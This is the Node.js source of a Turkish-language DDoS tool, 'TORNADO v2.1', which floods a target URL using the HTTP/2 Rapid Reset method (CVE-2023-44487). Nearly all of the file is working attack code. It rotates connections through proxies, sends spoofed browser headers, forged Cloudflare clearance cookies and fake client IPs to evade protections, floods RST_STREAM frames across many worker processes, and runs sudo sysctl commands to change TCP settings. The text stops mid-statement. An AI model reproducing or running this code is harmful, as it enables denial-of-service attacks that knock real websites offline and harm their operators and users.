// made by @rapidreset aka mitigations for mesh botnet
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

// HPACK alternatif import
let HPACK;
try {
    HPACK = require('hpack');
} catch (e) {
    try {
        // Node.js native http2 HPACK kullan
        const http2 = require('http2');
        HPACK = {
            encode: (headers) => {
                // Basit HPACK encoding simülasyonu
                return Buffer.from(JSON.stringify(headers));
            },
            decode: (buffer) => {
                try {
                    return JSON.parse(buffer.toString());
                } catch {
                    return [['status', '200']];
                }
            },
            setTableSize: () => {}
        };
    } catch {
        console.error('❌ HTTP/2 HPACK desteği bulunamadı!');
        process.exit(1);
    }
}

// Terminal UI için blessed import
let blessed;
try {
    blessed = require('blessed');
} catch (e) {
    console.log('📦 Blessed.js yüklenmemiş. Daha iyi UI için "npm install blessed" çalıştırın.');
    blessed = null;
}

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

// Gelişmiş saldırı parametreleri
let attack_multiplier = 1;
let rst_stream_count = 0;
let connection_flood_mode = false;

const blockedDomain = [".gov", ".edu"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2024-03-30');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');
const useLegitHeaders = process.argv.includes('--legit');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    ╔══════════════════════════════════════════════════════════════════════════════════════╗
    ║                          TORNADO v2.1 - HTTP/2 Saldırı Aracı                       ║
    ║                     RST STREAM Yöntemi (CVE-2023-44487) Destekli                    ║
    ║                        Güncelleme: 01.05.2024 / @resetcve ile                       ║
    ╠══════════════════════════════════════════════════════════════════════════════════════╣
    ║  Geliştiriciler: @resetcve - Yöntem geliştirici / @shiftwise - Yeniden kodlama      ║
    ╚══════════════════════════════════════════════════════════════════════════════════════╝
    
    📋 KULLANIM VE ÖRNEK:
      node ${process.argv[1]} <GET/POST> <hedef> <süre> <thread> <hız_sınırı> <proxy>
      node ${process.argv[1]} GET "https://hedef.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
    
    ⚙️  SEÇENEKLER:
      --query 1/2/3     : Rastgele sorgu dizesi (1: ?cf__chl_tk, 2: ?fwfwfwfw, 3: ?q=fwfwwffw)
      --delay <1-1000>  : İstekler arası gecikme 1-100 ms (optimal) varsayılan 1 ms
      --cookie "f=f"    : Özel çerez - %RAND% desteği var örn: "bypassing=%RAND%"
      --bfm true/null   : Bot savaş modu - gerekiyorsa true yap, gerekmiyorsa kullanma
      --referer url/rand: Özel referer - rand seçersen rastgele domain üretir örn: fwfwwfwfw.net
      --postdata "..."  : POST verisi için - format "user=f&pass=%RAND%"
      --randrate        : Hızı 1-90 arası rastgele ayarla - iyi bypass sağlar
      --full            : Büyük backend'ler için (Amazon, Akamai vb.) - Cloudflare destekli
      --http 1/2/mix    : HTTP sürümü seç (1: HTTP/1.1, 2: HTTP/2, mix: karışık)
      --debug           : Durum kodlarını göster (daha az RPS, daha fazla kaynak kullanır)
      --header "f:f"    : Özel başlıklar - # ile ayır örn: "f:f#f1:f1"
      --legit           : Tamamen yasal başlıklarla saldır (Cloudflare dışı)
    
    🚀 GELİŞMİŞ ÖZELLİKLER:
      💻 İnteraktif Dashboard: npm install blessed (gelişmiş UI için)
      📊 Gerçek zamanlı grafikler ve istatistikler
      📋 Detaylı log sistemi ve milestone bildirimleri
      ⌨️  Klavye kısayolları: q=çıkış, Ctrl+C=zorla çık
    `);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (currentDate > targetDate) {
    console.error('❌ Hata: Yöntem güncelliğini yitirdi, @rapidreset ile iletişime geçin');
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`❌ Domain ${blockedDomain} engellendi, eğer bu bir hata ise @rapidreset ile iletişime geçin`);
    process.exit(1);
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('❌ Hata: İstek yöntemi sadece GET/POST/HEAD/OPTIONS olabilir');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('❌ Hata: Protokol sadece https:// veya http:// olabilir');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('❌ Hata: Süre 86400 saniyeden fazla olamaz')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('❌ Hata: Thread sayısı 256\'dan fazla olamaz')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
    console.error(`❌ Hata: Hız sınırı 90\'dan fazla olamaz`)
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 123);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';


    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.7';

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    //console.log(headers.toString());
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    var [proxyHost, proxyPort] = '1.1.1.1:3128';

    if(customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    }

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0], // ENABLE_PUSH disabled for better performance
                        [3, 100], // MAX_CONCURRENT_STREAMS - aggressive value
                        [4, custom_window],
                        [5, 16384], // MAX_FRAME_SIZE
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0
                                        statuses["GOAWAY"]++
                                    }
                                }
                                
                                // Agresif RST_STREAM gönder
                                for (let i = 1; i <= 10; i += 2) {
                                    tlsSocket.write(encodeRstStream(i, 3, 0));
                                }
                                rst_stream_count += 5;
                                
                                // Bağlantıyı derhal sonlandır
                                tlsSocket.end(() => tlsSocket.destroy());
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    
                    let currentRateLimit;
                    if (randrate !== undefined) {
                        currentRateLimit = getRandomInt(1, 59);
                    } else {
                        currentRateLimit = process.argv[6];
                    }
                    
                    // Agresif mod: daha fazla istek gönder
                    const requestCount = isFull ? Math.max(currentRateLimit, 10) : Math.max(1, Math.floor(currentRateLimit / 10));
                    
                    for (let i = 0; i < requestCount; i++) {
                        const browserVersion = getRandomInt(120, 123);
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                        if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 123) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                        }

                        const isBrave = wfwf === 'Brave';
                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
                        const secGpcValue = isBrave ? "1" : undefined;
                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                   
                        if(customUA) {
                            userAgent = customUA;
                        }

                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
                        
                        // Geliştirilmiş başlık kombinasyonu
                        const baseHeaders = {
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        };
                        
                        const dynamicHeaders = {
                            ...(Math.random() < 0.6 && { "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            ...(Math.random() < 0.7 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.7 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.7 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.7 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            ...(Math.random() < 0.4 && { "priority": `u=${getRandomInt(0,1)}, i` }),
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        };

                        // Fake headers for bypassing
                        const fakeHeaders = {
                            ...(Math.random() < 0.4 && { [`x-client-session${getRandomChar()}`]: `${randstr(8)}${getRandomChar()}` }),
                            ...(Math.random() < 0.4 && { [`sec-ms-gec-version${getRandomChar()}`]: `${getRandomInt(1,9)}${getRandomChar()}` }),
                            ...(Math.random() < 0.4 && { [`x-request-data${getRandomChar()}`]: `${randstr(6)}${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-for`]: `${getRandomInt(1,255)}.${getRandomInt(1,255)}.${getRandomInt(1,255)}.${getRandomInt(1,255)}` }),
                            ...(Math.random() < 0.3 && { [`x-real-ip`]: `${getRandomInt(1,255)}.${getRandomInt(1,255)}.${getRandomInt(1,255)}.${getRandomInt(1,255)}` }),
                        };

                        const combinedHeaders = Object.entries(baseHeaders).concat(
                            Object.entries(dynamicHeaders).filter(a => a[1] != null),
                            useLegitHeaders ? [] : Object.entries(fakeHeaders).filter(a => a[1] != null)
                        );

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        // HPACK encoding with CONTINUATION frame support
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        // Her isteğe farklı stream ID
                        requests.push(encodeFrame(streamId, 1, packed, Math.random() < 0.3 ? 0x25 : 0x5));
                        streamId += 2;
                        
                        // Bazen RST_STREAM frame'leri de gönder
                        if (Math.random() < 0.1 && streamId > 3) {
                            requests.push(encodeRstStream(streamId - 4, 3, 0));
                        }
                    }

                    // Toplu gönderim
                    if (requests.length > 0) {
                        tlsSocket.write(Buffer.concat(requests), (err) => {
                            if (!err) {
                                const nextDelay = isFull ? 
                                    Math.max(100, 1000 - (requestCount * 50)) : 
                                    Math.max(50, 1000 / currentRateLimit);
                                    
                                setTimeout(() => {
                                    doWrite()
                                }, nextDelay)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        });
                    }
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
    
    // Dinamik parametre ayarlama
    if (timer <= 15) {
        custom_header = Math.min(custom_header + getRandomInt(1, 3), 524288);
        custom_window = Math.min(custom_window + getRandomInt(100, 1000), 16777215);
        custom_table = Math.min(custom_table + getRandomInt(1, 10), 131072);
        custom_update = Math.min(custom_update + getRandomInt(1000, 10000), 33554432);
        attack_multiplier = Math.min(attack_multiplier + 0.1, 3.0);
    } else {
        // Reset değerleri
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        attack_multiplier = 1;
        timer = 0;
    }
}, 8000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    
    if (blessed) {
        console.log(`
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                               🚀 SALDIRI BAŞLATILDI                                ║
║                         Füze.Plaşkov v2.1 (Gelişmiş UI) - x.com/paro               ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
📊 Saldırı Bilgileri:
   🎯 Hedef: ${target}
   ⏱️  Süre: ${time} saniye
   🧵 Thread: ${threads}
   ⚡ Hız: ${ratelimit}/sn
   📡 HTTP: ${forceHttp == 1 ? 'HTTP/1.1' : forceHttp == 2 ? 'HTTP/2' : 'Karışık'}
   🔍 Debug: ${debugMode ? 'Gelişmiş Dashboard Aktif' : 'Pasif'}

💡 Gelişmiş UI aktif! Debug modunda interaktif dashboard kullanılacak.
   Çıkış için: Ctrl+C veya 'q' tuşu
`);
    } else {
        console.log(`
